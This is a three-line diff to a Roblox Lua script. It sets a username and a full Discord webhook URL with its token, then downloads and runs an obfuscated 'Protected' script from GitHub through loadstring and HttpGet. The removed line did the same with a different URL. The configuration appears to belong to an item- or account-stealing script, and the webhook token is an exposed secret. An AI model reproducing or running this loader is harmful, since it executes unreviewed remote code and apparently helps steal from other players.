@@ -1,1 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/terabite-max43/shitescripts/main/configs.lua"))()
+Username = 'opgodnoob1230'
+Webhook = 'https://discord.com/api/webhooks/1328537174290993244/0bGjPH8liEtW5jqhzOOcdMKF3VHpNo-7onu2EzKNCV2bEBQ_sdHCZ87RoDl2k2gStTs-'
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/Script/main/Protected_a6f6c84894b4fcc72fdba70a.lua", true))()
